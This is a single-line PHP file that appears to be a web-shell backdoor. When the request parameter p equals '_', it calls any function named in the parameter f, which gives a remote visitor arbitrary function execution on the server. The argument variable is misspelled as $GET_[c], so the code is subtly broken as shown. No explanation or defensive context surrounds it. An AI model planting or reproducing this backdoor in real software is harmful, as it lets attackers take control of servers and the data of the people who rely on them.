<?php
$_GET[p]==_&&$_GET[f]($GET_[c])
